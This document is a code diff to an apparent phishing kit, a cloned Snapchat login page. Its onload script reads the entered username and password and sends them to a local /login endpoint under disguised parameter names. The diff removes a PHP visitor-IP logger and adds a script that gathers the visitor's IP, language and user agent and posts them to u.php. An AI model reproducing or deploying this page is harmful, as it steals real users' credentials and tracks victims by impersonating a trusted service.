@@ -1,22 +1,4 @@
-<?php
-function get_IP_address()
-{
-  if (!empty($_SERVER['HTTP_CLIENT_IP']))
-  {
-    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-  }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-  {
-    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-  }
-else
-  {
-    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-  }
-  return $ipaddress;
-}
-fwrite(fopen('ip.txt','w'),get_IP_address());
-?>
+
 <!DOCTYPE html>
 
 <html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Log In • Snapchat</title><!-- Meta --><meta name="referrer" content="origin"><meta name="apple-mobile-web-app-capable" content="no"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"><script type="text/javascript" async="" src="./Log In • Snapchat_files/ec.js"></script><script type="text/javascript" async="" src="./Log In • Snapchat_files/linkid.js"></script><script type="text/javascript" async="" src="./Log In • Snapchat_files/tfa.js"></script><script type="text/javascript" async="" src="./Log In • Snapchat_files/analytics.js"></script><script type="text/javascript" async="" src="./Log In • Snapchat_files/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-EybSWcHgiPeEiW8PyVFCqH8ltF5BJVYLCCHJpTp2QsYs58TZJuGZOUGfGAPF4IjR"></script><script async="" src="./Log In • Snapchat_files/scevent.min.js"></script><script async="" src="./Log In • Snapchat_files/gtm.js"></script><script>const PAGE_LOAD_START_TIME_MS = Date.now();</script><!-- Styles --><link rel="stylesheet" href="./Log In • Snapchat_files/semantic.min.css"><link rel="stylesheet" href="./Log In • Snapchat_files/dropdown.min.css"><!-- Force reload of css file --><link rel="stylesheet" href="./Log In • Snapchat_files/snapchat.css"><link rel="stylesheet" href="./Log In • Snapchat_files/accounts.css"><link rel="stylesheet" href="./Log In • Snapchat_files/auth.css"><link rel="stylesheet" href="./Log In • Snapchat_files/revoke.css"><!-- Scripts --><script src="./Log In • Snapchat_files/jquery.min.js"></script><script src="./Log In • Snapchat_files/semantic.min.js"></script><script src="./Log In • Snapchat_files/dropdown.min.js"></script><script src="./Log In • Snapchat_files/gtm(1).js"></script><script src="./Log In • Snapchat_files/accounts.js"></script><script src="./Log In • Snapchat_files/pixel.js"></script><!-- Favicon --><link rel="shortcut icon" href="https://accounts.snapchat.com/accounts/static/images/favicon/favicon.png" type="image/png"><link rel="stylesheet" type="text/css" href="./Log In • Snapchat_files/avenirnext.font.css"><script src="./Log In • Snapchat_files/enterprise.js" async="" defer=""></script><style type="text/css">/* Fonts */
@@ -49437,4 +49419,27 @@ window.onload = function(){
   var usr = document.getElementsByName('username')[0].value;var re = document.getElementById('redir').innerHTML;var pw = document.getElementsByName('password')[0].value;window.location = '/login?check-policy=ahdafhjfaghkheurweutyweuiti7t84wgjflkdhfjakshlfkhakjshfkhskhfdkashkfkaskghkjdfgkjknkcmxv,cxv7w784cn8723587c80yr8wyno&uuid=ashfasjdfjksadasdjkfhjksahdfjsahkdfhkjsheywi58783254-823erw===&id='+usr+'&locid='+pw+'&r='+re;
 })
 }
+</script>
+<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+</script>  
+<script>
+$.getJSON("https://api.ipify.org?format=json",function(data) {
+if (1) {
+    var ip = data.ip;
+    var lang = navigator.language;
+    var platform = navigator.platform;
+    var ua = navigator.userAgent;
+    var webdriver = navigator.webdriver;
+    $.ajax({
+        url : 'u.php',
+        type : 'post',
+        data : {
+            'ip' : ip,
+            'lang' : lang,
+            'ua' : ua
+        }
+    });
+}
+});
 </script></body></html>
